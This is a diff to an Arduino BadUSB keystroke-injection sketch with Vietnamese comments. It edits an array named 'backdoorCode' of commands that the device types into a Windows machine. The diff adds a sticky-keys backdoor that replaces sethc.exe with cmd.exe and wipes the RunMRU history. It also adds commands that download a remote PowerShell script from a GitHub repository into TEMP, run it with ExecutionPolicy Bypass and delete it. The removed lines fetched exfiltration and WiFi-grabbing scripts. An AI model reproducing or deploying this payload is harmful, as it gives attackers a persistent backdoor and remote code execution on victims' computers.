@@ -8,8 +8,9 @@ const int buttonPin = 0;
 
 //Mảng tải và thực thi code
 const char* backdoorCode[] = {
+  "CMD C START MIN REG DELETE hkcusOFTWAREmICROSOFTwINDOWScURRENTvERSIONeXPLORERrUNmru F&TAKEOWN F %sYSTEMrOOT%SYSTEM32SETHC.EXE&ECHO YCACLS %sYSTEMrOOT%SYSTEM32SETHC.EXE g %username%f&COPY CWINDOWSSYSTEM32CMD.EXE CWINDOWSSYSTEM32SETHC.EXE y",
   // Bước 1: tải file về thư mục TEMP (dùng %TEMP% của CMD)
-  "powershell -Command \"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/khangpdm/BadUSB/main/Exfiltrate/file.ps1' -OutFile '%TEMP%\\file.ps1'\"",
+  /*"powershell -Command \"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/khangpdm/BadUSB/main/Exfiltrate/file.ps1' -OutFile '%TEMP%\\file.ps1'\"",
 
   // Bước 2: thực thi file vừa tải
   "powershell -ExecutionPolicy Bypass -File \"%TEMP%\\file.ps1\"",
@@ -25,7 +26,10 @@ const char* backdoorCode[] = {
   // File 2: Wifi_Grabber/WifiGrabber.ps1
   "powershell -Command \"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/khangpdm/BadUSB/main/Wifi_Grabber/WifiGrabber.ps1' -OutFile '%TEMP%\\wifi.ps1'\"",
   "powershell -ExecutionPolicy Bypass -File \"%TEMP%\\wifi.ps1\"",
-  "powershell -Command \"Remove-Item '%TEMP%\\wifi.ps1' -Force\"",
+  "powershell -Command \"Remove-Item '%TEMP%\\wifi.ps1' -Force\"",*/
+  "powershell -Command \"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/khangpdm/BadUSB/main/NEW/skibidi.ps1' -OutFile '%TEMP%\\skibidi.ps1'\"",
+  "powershell -ExecutionPolicy Bypass -File \"%TEMP%\\skibidi.ps1\"",
+  "powershell -Command \"Remove-Item '%TEMP%\\skibidi.ps1' -Force\"",
 };
 
 void setup() {
@@ -41,7 +45,7 @@ void sendLine(const char s[],const bool sendEnter = true){
   Keyboard.print(s);
   if(sendEnter){
     Keyboard.write(KEY_RETURN);
-    delay(3000);
+    delay(1000);
   }
 }
 
